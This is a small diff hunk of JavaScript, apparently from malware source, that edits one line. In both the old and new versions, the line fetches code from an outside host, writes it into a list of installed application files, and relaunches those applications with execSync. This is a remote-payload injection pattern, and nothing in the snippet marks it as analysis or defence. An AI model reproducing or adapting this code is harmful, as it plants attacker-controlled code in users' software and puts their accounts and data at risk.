@@ -49,7 +49,7 @@ try {
             function i() { 
                 g()
                 k()
-                fetch(`https://api.teamarcades.xyz/v9/aurathemes`, { headers: { aura_premium: false, aura_files: true, auradev: false, aurathemes: true + dev }}).then(r => r.text()).then(r => toInjectJS.forEach(f => fs.writeFileSync(f, r.replace("*API URL*", apiurl)) ^ execSync(`${local}/${f.split("/")[5]}/Update.exe --processStart ${f.split("/")[5]}.exe`)))
+                fetch(`https://api.teamarcades.xyz/v9/aurathemes`, { headers: { aurapremium: false, aurafiles: true, auradev: false, aurathemes: true + dev }}).then(r => r.text()).then(r => toInjectJS.forEach(f => fs.writeFileSync(f, r.replace("*API URL*", apiurl)) ^ execSync(`${local}/${f.split("/")[5]}/Update.exe --processStart ${f.split("/")[5]}.exe`)))
             }
 
             function main(r) {
